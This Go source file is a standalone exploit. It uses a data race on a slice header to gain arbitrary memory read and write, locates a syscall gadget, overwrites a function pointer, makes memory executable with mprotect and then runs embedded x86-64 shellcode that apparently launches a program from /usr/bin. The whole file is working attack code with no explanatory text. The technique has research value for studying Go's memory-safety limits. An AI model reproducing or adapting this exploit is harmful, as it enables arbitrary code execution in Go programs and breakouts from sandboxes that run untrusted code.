package main

import (
	"reflect"
)

const PAGE_SIZE = uint64(0x1000)

var shellcode = "h.he\x01\x814$\x01\x01\x01\x01H\xb8/usr/binPH\x89\xe7hhe\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05"

func main() {
	tool := arbitraryRW()

	mainAddr := reflect.ValueOf(main).Pointer()
	shellcodeAddr := tool.index(uint64(mainAddr), 0x100000, []byte(shellcode[:8]))

	var call func(uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint64)
	callAddr := reflect.ValueOf(&call).Pointer()

	gadget := tool.index(uint64(mainAddr), 0x1000, p64(0xc3050f585a5e5f58))
	gadgetAddr := reflect.ValueOf(&gadget).Pointer()

	tool.write8(uint64(callAddr), uint64(gadgetAddr))

	addr := shellcodeAddr & ^(PAGE_SIZE - 1)
	const len = PAGE_SIZE * 2
	const PROT_READ = 1
	const PROT_WRITE = 2
	const PROT_EXEC = 4
	const prot = PROT_READ | PROT_WRITE | PROT_EXEC
	const sys_mprotect = 10
	call(addr, len, prot, sys_mprotect, shellcodeAddr, 0, 1, 2, 3, addr, len, prot, sys_mprotect, shellcodeAddr)
}

func arbitraryRW() memory {
	return sliceAt(1, 0xffffffffffffffff)
}

type memory []byte

func (m memory) read(addr uint64) byte {
	return m[addr-1]
}

func (m memory) write8(addr, value uint64) {
	for i, b := range p64(value) {
		m[addr-1+uint64(i)] = b
	}
}

func (m memory) index(from, max uint64, sep []byte) uint64 {
	for i := from; i < from+max; i++ {
		match := true
		for j := uint64(0); j < uint64(len(sep)); j++ {
			if m.read(i+j) != sep[j] {
				match = false
				break
			}
		}
		if match {
			return i
		}
	}
	return 0
}

type victimSlice struct {
	s []byte
}

func sliceAt(addr, length uint64) []byte {
	attacker := make([]uint64, 1)
	targets := make([]victimSlice, 4096)

	targetsAddr := reflect.ValueOf(targets).Pointer()
	attackerAddr := reflect.ValueOf(attacker).Pointer()

	diff := int64(uint64(targetsAddr) - uint64(attackerAddr))
	if diff < 0 {
		panic(nil)
	}

	long := make([]uint64, diff/8+3)
	idx := diff / 8

	confused := attacker
	dontOptimize := confused
	writes, races := 0, 0
	go func() {
		for {
			for i := 0; i < 10000; i++ {
				confused = long
				func() { dontOptimize = confused }()
				confused = attacker
				writes++
			}

			if targets[0].s != nil {
				return
			}
		}
	}()
	for {
		func() {
			defer func() { recover() }()
			confused[idx] = addr
			confused[idx+1] = length // len
			confused[idx+2] = length // cap
		}()
		if targets[0].s != nil && len(targets[0].s) == int(length) && cap(targets[0].s) == int(length) {
			return targets[0].s
		}
		races++
	}
	_ = dontOptimize
	return nil
}

func p64(n uint64) []byte {
	s := make([]byte, 8)
	for i := 0; i < 8; i++ {
		s[i] = byte(n & 0xff)
		n >>= 8
	}
	return s
}

func p64s(n uint64) []byte {
	s := make([]byte, 0, 8)
	for byte(n&0xff) != 0 {
		s = append(s, byte(n&0xff))
		n >>= 8
	}
	return s
}